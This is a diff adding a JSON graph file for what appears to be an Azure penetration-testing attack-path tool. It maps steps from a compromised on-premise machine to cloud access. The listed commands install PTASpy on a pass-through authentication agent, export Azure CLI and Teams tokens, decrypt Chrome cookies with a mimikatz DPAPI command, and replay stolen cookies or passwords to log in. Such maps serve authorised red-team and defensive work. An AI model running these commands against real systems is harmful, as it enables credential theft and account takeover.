@@ -1,0 +1,47 @@
+{
+    "elements": [
+        { "data": { "id": "root", "title": "Azure", "description": "Azure cloud provider", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-attacker" },
+        { "data": { "id": "onPremise", "title": "On-Premise", "description": "On-Premise environments", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "id": "azureAdConnect", "title": "Azure AD Connect", "description": "Azure AD Connect configurations", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "id": "compromisedMachine", "title": "Compromised Machine", "description": "Compromised machine scenarios", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "source": "root", "target": "onPremise" }, "classes": "edge" },
+        { "data": { "source": "onPremise", "target": "azureAdConnect" }, "classes": "edge" },
+        { "data": { "source": "onPremise", "target": "compromisedMachine" }, "classes": "edge" }
+    ],
+    "azureAdConnect": [
+        { "data": { "id": "pta", "title": "Pass-through Authentication - PTA", "description": "PTA configurations", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "source": "azureAdConnect", "target": "pta" }, "classes": "edge" }
+    ],
+    "pta": [
+        { "data": { "id": "installAadIntPtaSpy", "title": "AADIntPTASpy", "description": "Installs PTASpy to the pass-thru authentication agent on the current computer. Must be run as Local Admin on the computer having Azure AD Authentication Agent installed and running (AzureADConnectAuthenticationAgentService.exe).", "ifSuccussed": "If this Action succussed Please check Username & Password option", "command": "Get-AADIntPTASpyLog", "reference": "https://aadinternals.com/aadinternals/#install-aadintptaspy", "category": false }, "classes": "node-normal" },
+        { "data": { "source": "pta", "target": "installAadIntPtaSpy" }, "classes": "edge" }
+    ],
+    "compromisedMachine": [
+        { "data": { "id": "passTheCookie", "title": "Pass the Cookie", "description": "Pass the Cookie techniques", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "id": "localCloudCredentials", "title": "Local Cloud Credentials", "description": "Local cloud credentials", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "source": "compromisedMachine", "target": "passTheCookie" }, "classes": "edge" },
+        { "data": { "source": "compromisedMachine", "target": "localCloudCredentials" }, "classes": "edge" }
+    ],
+    "localCloudCredentials": [
+        { "data": { "id": "azAccountGetAccessToken", "title": "az account get-access-token", "description": "Get access token using az account", "command": "az account get-access-token", "reference": "", "category": false, "ifSuccussed": "If successed - check Valid Token options" }, "classes": "node-normal" },
+        { "data": { "id": "exportAadIntAzureCliTokens", "title": "Export-AADInt AzureCliTokens", "description": "Export Azure CLI tokens using AADInt", "command": "Export-AADIntAzureCliTokens", "reference": "", "category": false, "ifSuccussed": "If successed - check Valid Token options" }, "classes": "node-normal" },
+        { "data": { "id": "exportAadIntTeamsTokens", "title": "Export-AADInt TeamsTokens", "description": "Export Teams tokens using AADInt", "command": "Export-AADInt TeamsTokens", "reference": "", "category": false, "ifSuccussed": "If successed - check Valid Token options" }, "classes": "node-normal" },
+        { "data": { "id": "filesInAzure", "title": "Local Files", "description": "Files in the Azure directory", "command": "dir C:\\Users\\<username>\\.Azure", "reference": "", "category": false, "ifSuccussed": "If successed - check Valid Token options" }, "classes": "node-normal" },
+        { "data": { "source": "localCloudCredentials", "target": "azAccountGetAccessToken" }, "classes": "edge" },
+        { "data": { "source": "localCloudCredentials", "target": "exportAadIntAzureCliTokens" }, "classes": "edge" },
+        { "data": { "source": "localCloudCredentials", "target": "exportAadIntTeamsTokens" }, "classes": "edge" },
+        { "data": { "source": "localCloudCredentials", "target": "filesInAzure" }, "classes": "edge" }
+    ],
+    "passTheCookie": [
+        { "data": { "id": "dpapiDump", "title": "DPAPI Dump", "description": "Dump DPAPI data", "command": "", "reference": "", "category": true, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "source": "passTheCookie", "target": "dpapiDump" }, "classes": "edge" }
+    ],
+    "dpapiDump": [
+        { "data": { "id": "mimikatz", "title": "Mimikatz", "description": "Use Mimikatz for DPAPI dump", "command": "mimikatz.exe privilege::debug log \"dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect\" exit", "reference": "https://github.com/HackTricks-wiki/hacktricks-cloud/blob/master/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/az-pass-the-cookie.md", "category": false, "ifSuccussed": "" }, "classes": "node-normal" },
+        { "data": { "source": "dpapiDump", "target": "mimikatz" }, "classes": "edge" }
+    ],
+    "mimikatz": [
+        { "data": { "id": "azurePortalLogin", "title": "Azure Portal Login", "description": "Login to Azure Portal", "command": "Insert the cookies or the password you got - to portal and login", "reference": "https://portal.azure.com/", "category": false, "ifSuccussed": "if successfully logged in - check Valid Token options" }, "classes": "node-normal" },
+        { "data": { "source": "mimikatz", "target": "azurePortalLogin" }, "classes": "edge" }
+    ]
+}
